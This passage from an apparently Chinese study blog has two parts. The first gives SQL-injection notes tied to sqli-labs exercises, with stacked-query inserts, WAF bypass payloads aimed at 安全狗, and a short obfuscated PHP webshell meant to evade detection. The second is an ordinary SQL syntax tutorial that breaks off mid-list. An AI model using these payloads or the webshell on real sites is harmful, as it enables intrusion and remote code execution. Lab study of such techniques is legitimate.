<h3 id="注入技巧"><a href="#注入技巧" class="headerlink" title="注入技巧"></a>注入技巧</h3><p>类型判断+回显情况</p>
<h2 id="d-二次、加解密、DNSlog注入等"><a href="#d-二次、加解密、DNSlog注入等" class="headerlink" title="d)二次、加解密、DNSlog注入等"></a>d)二次、加解密、DNSlog注入等</h2><h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>一般比如，将数据进行了加密，需要弄清楚它所采用的加密解密算法，做注入时，将输入数据同样加密后再提交</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>适用场景：已知代码的情况下，构造</p>
<p>经典例子就是，注册时，允许注册admin’#这种账号，登陆进去修改admin’#的密码时其实是修改了admin（如果有的话）的密码。等于说你已知管理员账号，但不知道密码，你又可以注册又可以改密码，这种情况。</p>
<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>适用场景：需要有文件读取的操作权限，解决盲注不回显数据的问题。</p>
<p>利用concat将select查询的结果与一个dnslog地址进行拼接，形成一个能够访问的域名；接着用load_file()导入或请求这个地址，在dnslog中就会有记录。</p>
<p>可以用平台，可以用github上的dnslog.py脚本</p>
<h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h3><p>适用场景：为了避免遇到加解密注入时，自己进行加密注入。以base64为例，自己写个php文件，获取该网站url，利用base64_encode函数对输入的参数x进行加密。</p>
<p>sqlmap提供爆破参数，传递给php，php尝试获取内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=&#x27;http://dasdadaawfwfaf/asd.asp?id=&#x27;;</span><br><span class="line">$payload=base64_encode($_GET[&#x27;x&#x27;]);</span><br><span class="line">$urls=$url.$payload;</span><br><span class="line">file_get_contents(); //在php中，字符串拼接是&quot;.&quot; //有的说，换成header()</span><br><span class="line">//echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以该php代码放到本地环境中,如phpstudy&#x2F;www&#x2F;1.php</p>
<p>sqlmap就可以:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost:8080/1.php?x=&quot; - v 3</span><br></pre></td></tr></table></figure>

<p>sqli-labs:</p>
<p>less 21 cookie&amp;加解密注入</p>
<p>less24 post登陆框&amp;二次注入</p>
<p>less 9 load_file&amp;dnslog带外注入</p>
<h2 id="e-堆叠注入及WAF绕过"><a href="#e-堆叠注入及WAF绕过" class="headerlink" title="e)堆叠注入及WAF绕过"></a>e)堆叠注入及WAF绕过</h2><h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>（stacked injection），注入语句时，可以有多个语句。</p>
<p>局限性：受到API和数据库的限制</p>
<p><code>?id=1;insert into users(id,username,password) values(1,2,3) --+</code></p>
<p>适用场景举例：注入需要管理员账号密码，密码是加密的，无法解密；那么堆叠注入进行插入数据，由于用户和密码是自定义的，所以可以正常解密登录</p>
<p>sqli-labs:</p>
<p>less 38 堆叠注入</p>
<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><blockquote>
<p>WAF绕过<br>数据<br>    大小写<br>    加解密<br>    编码解码<br>    等价函数<br>    特殊符号<br>    反序列化<br>    注释符混用<br>方式<br>    提交方式更改<br>    变异<br>其他<br>    Fuzz&#x2F;模糊测试<br>    数据库特性<br>    垃圾数据溢出<br>    HTTP参数污染</p>
</blockquote>
<p>补充：内联注释绕过：MYSQL数据库特性 &#x2F;*!需要查询的数据*&#x2F;</p>
<h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p><img src="/../../../Typora/img111/image-20230524224452252.png" alt="image-20230524224452252"></p>
<p>即有多个相同参数时，以哪个位置的参数为主。</p>
<p>以php为例：</p>
<blockquote>
<?php

​     \$get=  $_GET['x'];

echo $get

?>

<p>输入参数为….?x&#x3D;12&amp;x&#x3D;7时</p>
<p>结果显示为7</p>
</blockquote>
<p><strong>宝塔WAF搭建部署。</strong></p>
<p>绕过举例：如果拦截了<strong>database()<strong>这个函数，可以用</strong>database&#x2F;</strong>&#x2F;()**；</p>
<p>2021的安全狗联合绕过1：</p>
<p><code>?id=-1 union%23a%0Aselect 1,2,3#</code></p>
<blockquote>
<p>%23a%0Ax相当于#a换行符</p>
<p>相当于：换行执行</p>
<p>union #a</p>
<p>select 1,2,3#</p>
</blockquote>
<p>安全狗绕过2：</p>
<p>一般是字符串变形</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">$a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>达到免杀效果。</p>
<p><a href="https://www.freebuf.com/articles/web/195304.html">https://www.freebuf.com/articles/web/195304.html</a></p>
<p>php+apache下：</p>
<p><code>?id=1/**&amp;id=-1 union select 1,2,3#*/</code></p>
<p>原理相当于：&#x2F;**…*&#x2F;起注释作用，安全狗获得整段数据，匹配的是<code>1/**&amp;id=-1 union select 1,2,3#*/</code>，识别到后面是注释符时，正常情况下不执行，安全狗直接不管，但参数污染导致接收的是真实数据是<code>-1 union select 1,2,3#*/</code></p>
<p>一般都是脚本试出来的。</p>
<p>像这种绕过，一般要去论坛上找最新的了。</p>
<h2 id="f-sqlmap绕过waf"><a href="#f-sqlmap绕过waf" class="headerlink" title="f)sqlmap绕过waf"></a>f)sqlmap绕过waf</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>waf绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>sql语法</title>
    <url>/2023/08/04/sql%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h1 id="一、查询"><a href="#一、查询" class="headerlink" title="一、查询"></a>一、查询</h1><h2 id="1-全表查询"><a href="#1-全表查询" class="headerlink" title="1.全表查询"></a>1.全表查询</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from student</span><br><span class="line">//或者特定字段查询</span><br><span class="line">select name,age from student</span><br></pre></td></tr></table></figure>



<p>建表语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table if not exists `student`</span><br><span class="line">(</span><br><span class="line">	`id` integer	not null primary key  AUTOINCREMENT,</span><br><span class="line">	`name` varchar(256)	nut null,</span><br><span class="line">	`age`	int 	null,</span><br><span class="line">	`class_id`	bigint	nut null,</span><br><span class="line">	`score`	double default 0 null,</span><br><span class="line">	`exam_num` int default 0 null</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">insert into	`studenyt` (`name`,`age`,`class_id`,`score`,`exam_num`) </span><br><span class="line">values (&#x27;asd&#x27;,&#x27;12&#x27;,&#x27;1&#x27;,&#x27;256&#x27;,`4`);</span><br></pre></td></tr></table></figure>

<h3 id="2-别名查询"><a href="#2-别名查询" class="headerlink" title="2.别名查询"></a>2.别名查询</h3><p>别名语法 <code>&#123;原始字段名&#125; as &#123;别名&#125;</code> 来为查询结果的列名取一个便于理解的名称。通过使用别名，我们可以更直观地知道查询结果中每一列的含义，方便阅读和使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name as 学生姓名,age as 学生年龄 from student</span><br></pre></td></tr></table></figure>

<p>sql也可以把常量作为列名</p>
<p>比如 select 200,’啦啦啦’ as hobby</p>
<blockquote>
<table>
<thead>
<tr>
<th align="left">200</th>
<th align="left">hobby</th>
</tr>
</thead>
<tbody><tr>
<td align="left">200</td>
<td align="left">啦啦啦</td>
</tr>
</tbody></table>
</blockquote>
<h3 id="3-常量和运算"><a href="#3-常量和运算" class="headerlink" title="3.常量和运算"></a>3.常量和运算</h3><p>常量指固定的数值或文本，运算则是对这些常量进行数学或字符串操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,score,score*2 as double_score from student</span><br></pre></td></tr></table></figure>

<p>将分数的2倍额外作为一列，展现出来</p>
<h2 id="2-条件查询"><a href="#2-条件查询" class="headerlink" title="2.条件查询"></a>2.条件查询</h2><p>只想取表中的部分数据</p>
<p>用where子句过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,score from student where name==&#x27;羽泪云&#x27;</span><br></pre></td></tr></table></figure>

<p>也可以!&#x3D;，&gt;，between</p>
<h3 id="1-空值"><a href="#1-空值" class="headerlink" title="1.空值"></a>1.空值</h3><p>应用场景，比如筛选出没有参加考试的学生</p>
<p>用is null筛选出空值的；is not null筛选出不为空的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,age,score from student where score is null</span><br></pre></td></tr></table></figure>

<h3 id="2-模糊查询"><a href="#2-模糊查询" class="headerlink" title="2.模糊查询"></a>2.模糊查询</h3><p>比如查询姓氏，以张开头(<code>&#39;张%&#39;</code>)，以X结尾(<code>&#39;%X&#39;</code>)，不包含某个字</p>
<p>包含那就<code>like</code> ， 不包含那就 <code>not like</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,score from student where name not like &#x27;%李%&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="3-逻辑运算"><a href="#3-逻辑运算" class="headerlink" title="3.逻辑运算"></a>3.逻辑运算</h3><p>与、或、非</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,score from student where name like &#x27;%李%&#x27; or score&gt;500</span><br></pre></td></tr></table></figure>

<h1 id="二、去重"><a href="#二、去重" class="headerlink" title="二、去重"></a>二、去重</h1><p>distinct，单字段去重，或多个字段组合(唯一)去重</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select distinct class_id,exam_num from student</span><br></pre></td></tr></table></figure>

<p>筛选出不重复班级ID和考试编号的组合</p>
<h1 id="三、排序"><a href="#三、排序" class="headerlink" title="三、排序"></a>三、排序</h1><p>​	order by</p>
<p>升序 asc ，降序desc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,age,score from student order by score desc,age asc</span><br></pre></td></tr></table></figure>

<p>当第一个字段的值相同时，再按照第二个字段的值进行排序，以此类推。</p>
<p>按成绩降序排列，如果成绩相同，按年龄升序排列</p>
<h1 id="四、截断和偏移"><a href="#四、截断和偏移" class="headerlink" title="四、截断和偏移"></a>四、截断和偏移</h1><p>截断：挡住不需要看的部分（分页查询）</p>
<p>偏移：翻到要查看的位置</p>
<p>limit n，一次获取n条数据</p>
<p>limit n,m 从第n条开始，总共获取m条数据；第一条的下标是0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,age from student order by age asc limit 1,3</span><br></pre></td></tr></table></figure>

<h1 id="五、条件分支"><a href="#五、条件分支" class="headerlink" title="五、条件分支"></a>五、条件分支</h1><p>单分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CASE WHEN (name = &#x27;鸡哥&#x27;) THEN &#x27;会&#x27; ELSE &#x27;不会&#x27; END AS can_rap</span><br></pre></td></tr></table></figure>

<p>多分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CASE WHEN (条件1) THEN 结果1</span><br><span class="line">	   WHEN (条件2) THEN 结果2</span><br><span class="line">	   ...</span><br><span class="line">	   ELSE 其他结果 END</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,</span><br><span class="line">case when (age&gt;60) then &#x27;老同学&#x27; </span><br><span class="line">    when (age&gt;20) then &#x27;年轻&#x27;</span><br><span class="line">    else &#x27;小同学&#x27; end as age_level</span><br><span class="line">from student</span><br><span class="line">order by name asc</span><br></pre></td></tr></table></figure>

<h1 id="六、时间函数"><a href="#六、时间函数" class="headerlink" title="六、时间函数"></a>六、时间函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 获取当前日期</span><br><span class="line">SELECT DATE() AS current_date;</span><br><span class="line"></span><br><span class="line">-- 获取当前日期时间</span><br><span class="line">SELECT DATETIME() AS current_datetime;</span><br><span class="line"></span><br><span class="line">-- 获取当前时间</span><br><span class="line">SELECT TIME() AS current_time;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,date() as 当前日期 from student</span><br></pre></td></tr></table></figure>

<h1 id="七、字符串处理"><a href="#七、字符串处理" class="headerlink" title="七、字符串处理"></a>七、字符串处理</h1><p>转换大小写、计算字符串长度以及搜索和替换子字符串等。字符串处理函数可以帮助我们在数据库中对字符串进行加工和转换</p>
<p>比如姓名，有英文的转大写之类的，length()计算长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name,upper(name) as upper_name from student</span><br><span class="line">where name=&#x27;热dog&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="八、聚合函数"><a href="#八、聚合函数" class="headerlink" title="八、聚合函数"></a>八、聚合函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见的聚合函数包括：</span><br><span class="line"></span><br><span class="line">COUNT：计算指定列的行数或非空值的数量。</span><br><span class="line">SUM：计算指定列的数值之和。</span><br><span class="line">AVG：计算指定列的数值平均值。</span><br><span class="line">MAX：找出指定列的最大值。</span><br><span class="line">MIN：找出指定列的最小值。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sum(score) as total_score,</span><br><span class="line">        avg(score) as avg_score,</span><br><span class="line">        max(score) as max_score,</span><br><span class="line">        min(score) as min_score</span><br><span class="line"> from student</span><br></pre></td></tr></table></figure>

<h1 id="九-分组聚合"><a href="#九-分组聚合" class="headerlink" title="九.分组聚合"></a>九.分组聚合</h1><p>对数据进行分类并对每个分类进行聚合计算的操作。</p>
<p>应用场景：某个学校可以按照班级将学生分组，并对每个班级进行统计。某个学校可以按照班级将学生分组，并对每个班级进行统计。</p>
<p>在 SQL 中，通常使用 <code>GROUP BY</code> 关键字对数据进行分组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select class_id,avg(score) as avg_score from student group by class_id</span><br></pre></td></tr></table></figure>

<p>统计每个班级的平均分</p>
<h2 id="1-多字段分组"><a href="#1-多字段分组" class="headerlink" title="1.多字段分组"></a>1.多字段分组</h2><p><code>id</code>（学号）、<code>name</code>（姓名）、<code>class_id</code>（班级编号）、<code>exam_num</code>（考试次数）、<code>score</code>（成绩），统计学生表中<strong>每个班级</strong>，<strong>每次考试</strong>的<strong>总</strong>学生<strong>人数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select class_id,exam_num,count(*) as total_num </span><br><span class="line">from student</span><br><span class="line">group by class_id,exam_num</span><br></pre></td></tr></table></figure>



<h2 id="2-having-子句"><a href="#2-having-子句" class="headerlink" title="2.having 子句"></a>2.having 子句</h2><p>HAVING 子句用于在分组聚合后对分组进行过滤。它允许我们对分组后的结果进行条件筛选，只保留满足特定条件的分组。</p>
<p>区别：WHERE 子句用于在 <strong>分组之前</strong> 进行过滤，而 HAVING 子句用于在 <strong>分组之后</strong> 进行过滤。</p>
<p>示例：</p>
<p>统计学生表中<strong>班级</strong>的<strong>总成绩</strong>超过 150 分的<strong>班级编号（class_id）和总成绩（total_score）</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select class_id,sum(score) as total_score  </span><br><span class="line">from student</span><br><span class="line">group by class_id</span><br><span class="line">having total_score&gt;150</span><br></pre></td></tr></table></figure>

<h1 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h1><h2 id="1-关联查询"><a href="#1-关联查询" class="headerlink" title="1.关联查询"></a>1.关联查询</h2><p>假设有一个学生表 <code>student</code>，包含以下字段：<code>id</code>（学号）、<code>name</code>（姓名）、<code>age</code>（年龄）、<code>class_id</code>（班级编号）。还有一个班级表 <code>class</code>，包含以下字段：<code>id</code>（班级编号）、<code>name</code>（班级名称）、<code>level</code>（班级级别）。</p>
<p>单张表的基础上，获取更多额外数据，比如获取学生表中学生所属的班级信息等。</p>
<h3 id="cross-join"><a href="#cross-join" class="headerlink" title="cross join"></a>cross join</h3><p><code>CROSS JOIN</code> 是一种简单的关联查询，不需要任何条件来匹配行，它直接将左表的 <strong>每一行</strong> 与右表的 <strong>每一行</strong> 进行组合，返回的结果是两个表的笛卡尔积。</p>
<p>新建班级语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table if not exists `class`</span><br><span class="line">(</span><br><span class="line">    `id`       integer          not null primary key AUTOINCREMENT,</span><br><span class="line">    `name`     varchar(256)     not null,</span><br><span class="line">    `level`    varchar(256)     not null,</span><br><span class="line">    `student_num` integer default 0 not null,</span><br><span class="line">    `head_teacher_id` bigint not null</span><br><span class="line">);</span><br><span class="line">insert into `class` (`id`, `name`, `level`, `student_num`, `head_teacher_id`)</span><br><span class="line">values (1, &#x27;唱班&#x27;, &#x27;优&#x27;, 10, 1);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<p>将学生表和班级表的所有行组合在一起，并返回学生姓名（student_name）、学生年龄（student_age）、班级编号（class_id）以及班级名称（class_name）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.name as student_name,s.age as student_age, </span><br><span class="line">        s.class_id as class_id,</span><br><span class="line">        c.name as class_name</span><br><span class="line">from student s</span><br><span class="line">cross join class c</span><br></pre></td></tr></table></figure>

<h3 id="inner-join"><a href="#inner-join" class="headerlink" title="inner join"></a>inner join</h3><p>它根据两个表之间的关联条件，将满足条件的行组合在一起。</p>
<p>注意，INNER JOIN 只返回两个表中满足关联条件的<strong>交集部分</strong>，即在两个表中都存在的匹配行。</p>
<p>即只有两个表之间存在对应关系的数据才会被放到查询结果中。</p>
<p>示例：</p>
<p>根据学生表和班级表之间的<strong>班级编号进行匹配</strong>，返回学生姓名（<code>student_name</code>）、学生年龄（<code>student_age</code>）、班级编号（<code>class_id</code>）、班级名称（<code>class_name</code>）、班级级别（<code>class_level</code>）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.name as student_name,</span><br><span class="line">        s.age as student_age,</span><br><span class="line">        s.class_id as class_id,</span><br><span class="line">        c.name as class_name,</span><br><span class="line">        c.level as class_level</span><br><span class="line">from student s</span><br><span class="line">inner join class c on s.class_id==c.id</span><br></pre></td></tr></table></figure>

<h3 id="outer-join"><a href="#outer-join" class="headerlink" title="outer join"></a>outer join</h3><p>它根据指定的关联条件，将两个表中满足条件的行组合在一起，并 <strong>包含没有匹配的行</strong> 。</p>
<p>在 OUTER JOIN 中，包括 LEFT OUTER JOIN 和 RIGHT OUTER JOIN 两种类型，它们分别表示查询左表和右表的所有行（即使没有被匹配），再加上满足条件的交集部分。</p>
<p>示例：</p>
<p>请你编写一个 SQL 查询，根据学生表和班级表之间的班级编号进行匹配，返回学生姓名（<code>student_name</code>）、学生年龄（<code>student_age</code>）、班级编号（<code>class_id</code>）、班级名称（<code>class_name</code>）、班级级别（<code>class_level</code>），要求必须返回所有学生的信息（即使对应的班级编号不存在）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.name as student_name,</span><br><span class="line">        s.age as student_age,</span><br><span class="line">        s.class_id as class_id,</span><br><span class="line">        c.name as class_name,</span><br><span class="line">        c.level as class_level</span><br><span class="line">from student s</span><br><span class="line">outer join class c on s.class_id==c.id</span><br></pre></td></tr></table></figure>

<p> <code>语句错误：RIGHT and FULL OUTER JOINs are not currently supported</code></p>
<p>错了，用left join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.name as student_name,</span><br><span class="line">        s.age as student_age,</span><br><span class="line">        s.class_id as class_id,</span><br><span class="line">        c.name as class_name,</span><br><span class="line">        c.level as class_level</span><br><span class="line">from student s</span><br><span class="line">left join class c on s.class_id==c.id</span><br></pre></td></tr></table></figure>

<p>这样的结果就是，即使在班级表中没有记录的班级，也会出现，但是对应的班级表信息为空</p>
<h2 id="2-子查询"><a href="#2-子查询" class="headerlink" title="2.子查询"></a>2.子查询</h2><p>在一个查询语句内部 <strong>嵌套</strong> 另一个完整的查询语句，内层查询被称为子查询。子查询可以用于获取更复杂的查询结果或者用于过滤数据。</p>
<p>当执行包含子查询的查询语句时，数据库引擎会首<strong>先执行子查询</strong>，然后将其结果作为条件或数据源来执行<strong>外层查询</strong>。</p>
<p>示例：</p>
<p>使用子查询的方式来获取存在对应班级的学生的所有数据，返回学生姓名（<code>name</code>）、分数（<code>score</code>）、班级编号（<code>class_id</code>）字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,score,class_id </span><br><span class="line">from student</span><br><span class="line">where class_id in(</span><br><span class="line">    select distinct id</span><br><span class="line">    from class</span><br><span class="line">    where id is not null</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="1-exsits"><a href="#1-exsits" class="headerlink" title="1.exsits"></a>1.exsits</h3><p>子查询中的一种特殊类型是 “exists” 子查询，用于检查主查询的结果集是否存在满足条件的记录，它返回布尔值（True 或 False），而不返回实际的数据。</p>
<p>示例：</p>
<p>请你编写一个 SQL 查询，使用 exists 子查询的方式来获取 <strong>不存在对应班级的</strong> 学生的所有数据，返回学生姓名（<code>name</code>）、年龄（<code>age</code>）、班级编号（<code>class_id</code>）字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,</span><br><span class="line">        age,</span><br><span class="line">        class_id</span><br><span class="line">from student</span><br><span class="line">where not exists(</span><br><span class="line">    select 1</span><br><span class="line">    from class</span><br><span class="line">    where student.class_id=class.id</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="3-组合查询"><a href="#3-组合查询" class="headerlink" title="3.组合查询"></a>3.组合查询</h2><p>组合查询是一种将多个 SELECT 查询结果合并在一起的查询操作。</p>
<p>包括两种常见的组合查询操作：UNION 和 UNION ALL。</p>
<ol>
<li>UNION 操作：它用于将两个或多个查询的结果集合并， <strong>并去除重复的行</strong> 。即如果两个查询的结果有相同的行，则只保留一行。</li>
<li>UNION ALL 操作：它也用于将两个或多个查询的结果集合并， <strong>但不去除重复的行</strong> 。即如果两个查询的结果有相同的行，则全部保留。</li>
</ol>
<p>假设有一个学生表 <code>student</code>，包含以下字段：<code>id</code>（学号）、<code>name</code>（姓名）、<code>age</code>（年龄）、<code>score</code>（分数）、<code>class_id</code>（班级编号）。还有一个新学生表 <code>student_new</code>，包含的字段和学生表完全一致。</p>
<p>示例：</p>
<p>获取所有学生表和新学生表的学生姓名（<code>name</code>）、年龄（<code>age</code>）、分数（<code>score</code>）、班级编号（<code>class_id</code>）字段，要求保留重复的学生记录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,age,score,class_id </span><br><span class="line">from student</span><br><span class="line">union all</span><br><span class="line">select name,age,score,class_id </span><br><span class="line">from student_new</span><br></pre></td></tr></table></figure>

<h2 id="4-开窗函数"><a href="#4-开窗函数" class="headerlink" title="4.开窗函数"></a>4.开窗函数</h2><h3 id="1-sum-over"><a href="#1-sum-over" class="headerlink" title="1.sum over"></a>1.sum over</h3><p>允许我们在查询中进行对分组数据进行计算、 <strong>同时保留原始行的详细信息</strong></p>
<p>开窗函数可以与聚合函数（如 SUM、AVG、COUNT 等）结合使用，但与普通聚合函数不同，开窗函数不会导致结果集的行数减少。</p>
<p><code>SUM(计算字段名) OVER (PARTITION BY 分组字段名)</code></p>
<p>示例：</p>
<p>返回每个学生的详细信息（字段顺序和原始表的字段顺序一致），并计算每个班级的学生平均分（class_avg_score）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select </span><br><span class="line">id,</span><br><span class="line">name,</span><br><span class="line">age,</span><br><span class="line">score,</span><br><span class="line">class_id,</span><br><span class="line">avg(score) over (partition by class_id) as class_avg_score</span><br><span class="line">from student</span><br></pre></td></tr></table></figure>

<p>partition by子句按照class_id划分</p>
<h3 id="2-sum-over-order-by"><a href="#2-sum-over-order-by" class="headerlink" title="2.sum over order by"></a>2.sum over order by</h3><p>sum over order by，可以实现同组内数据的 <strong>累加求和</strong> 。</p>
<p><code>SUM(计算字段名) OVER (PARTITION BY 分组字段名 ORDER BY 排序字段 排序规则)</code></p>
<p>应用场景：老师对学生点名，对已点到的学生们的分数进行总和</p>
<p>示例：</p>
<p>返回每个学生的详细信息（字段顺序和原始表的字段顺序一致），并且按照分数升序的方式累加计算每个班级的学生总分（class_sum_score）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name,age,score,class_id,</span><br><span class="line">    sum(score) over (partition by class_id order by score asc)</span><br><span class="line">    as class_sum_score</span><br><span class="line"> from student</span><br></pre></td></tr></table></figure>

<h3 id="3-rank"><a href="#3-rank" class="headerlink" title="3.rank"></a>3.rank</h3><p>用于对查询结果集中的行进行 <strong>排名</strong> 的开窗函数。它可以根据指定的列或表达式对结果集中的行进行排序，并为每一行分配一个排名。在排名过程中，相同的值将被赋予相同的排名，而不同的值将被赋予不同的排名。</p>
<blockquote>
<p>当存在并列（相同排序值）时，Rank 会跳过后续排名，并保留相同的排名。</p>
</blockquote>
<p>应用场景：Rank 开窗函数的常见用法是在查询结果中查找前几名（Top N）或排名最高的行。</p>
<p>使用方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RANK() OVER (</span><br><span class="line">  PARTITION BY 列名1, 列名2, ... -- 可选，用于指定分组列</span><br><span class="line">  ORDER BY 列名3 [ASC|DESC], 列名4 [ASC|DESC], ... -- 用于指定排序列及排序方式</span><br><span class="line">) AS rank_column</span><br></pre></td></tr></table></figure>



<p>示例：</p>
<p>返回每个学生的详细信息（字段顺序和原始表的字段顺序一致），并且按照分数降序的方式计算每个<strong>班级</strong>内的学生的分数排名（ranking）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name,age,score,class_id,</span><br><span class="line">        rank() over</span><br><span class="line">        (partition by class_id order by score desc)</span><br><span class="line">        as ranking</span><br><span class="line"> from student</span><br></pre></td></tr></table></figure>

<h3 id="4-row-number"><a href="#4-row-number" class="headerlink" title="4.row_number"></a>4.row_number</h3><p>用于为查询结果集中的每一行 <strong>分配唯一连续排名</strong> 的开窗函数。</p>
<p>Row_Number 函数为每一行都分配一个唯一的整数值，不管是否存在并列（相同排序值）的情况。每一行都有一个唯一的行号，从 1 开始连续递增。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROW_NUMBER() OVER (</span><br><span class="line">  PARTITION BY column1, column2, ... -- 可选，用于指定分组列</span><br><span class="line">  ORDER BY column3 [ASC|DESC], column4 [ASC|DESC], ... -- 用于指定排序列及排序方式</span><br><span class="line">) AS row_number_column</span><br></pre></td></tr></table></figure>



<p>示例：</p>
<p>返回每个学生的详细信息（字段顺序和原始表的字段顺序一致），并且按照分数降序的方式给每个班级内的学生分配一个编号（row_number）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name,age,score,class_id,</span><br><span class="line">    row_number() over</span><br><span class="line">    (partition by class_id order by score desc)</span><br><span class="line">    as row_number</span><br><span class="line"></span><br><span class="line">from student</span><br></pre></td></tr></table></figure>

<p><del>即使呢score相同，也会有连续的row_number，即分个1,2,3排名出来</del> 等下，暂时先放着</p>
<h3 id="5-lag-x2F-lead"><a href="#5-lag-x2F-lead" class="headerlink" title="5.lag&#x2F;lead"></a>5.lag&#x2F;lead</h3><p>Lag 和 Lead 的作用是获取在<strong>当前行之前</strong>或<strong>之后</strong>的行的值，这两个函数通常在需要<strong>比较相邻行数据</strong>或<strong>进行时间序列分析</strong>时非常有用。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LAG(column_name, offset, default_value) OVER (PARTITION BY partition_column ORDER BY sort_column)</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><code>column_name</code>：要获取值的列名。</li>
<li><code>offset</code>：表示要向上偏移的行数。例如，offset为1表示获取上一行的值，offset为2表示获取上两行的值，以此类推。</li>
<li><code>default_value</code>：可选参数，用于指定当没有前一行时的默认值。</li>
<li><code>PARTITION BY</code>和<code>ORDER BY</code>子句可选，用于分组和排序数据。</li>
</ul>
</blockquote>
<p>lead同</p>
<p>应用场景：比如查看学生某个时期，之前的成绩，之后的成绩</p>
<p>示例：</p>
<p>返回每个学生的详细信息（字段顺序和原始表的字段顺序一致），并且按照分数降序的方式获取每个班级内的学生的前一名学生姓名（prev_name）、后一名学生姓名（next_name）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name,age,score,class_id,</span><br><span class="line">    lag(name,1,null) over (partition by class_id order by score desc) as prev_name,</span><br><span class="line">    lead(name,1,null) over (partition by class_id order by score desc) as next_name</span><br><span class="line">from student</span><br></pre></td></tr></table></figure>

<h1 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h1><h2 id="1-冒险者与金币"><a href="#1-冒险者与金币" class="headerlink" title="1.冒险者与金币"></a>1.冒险者与金币</h2><p>假设有一家冒险者公会，他们有一张名为 <code>rewards</code> 的表格，用于记录每个冒险者在各个任务中获得的金币奖励情况。</p>
<p>表格字段如下：</p>
<ul>
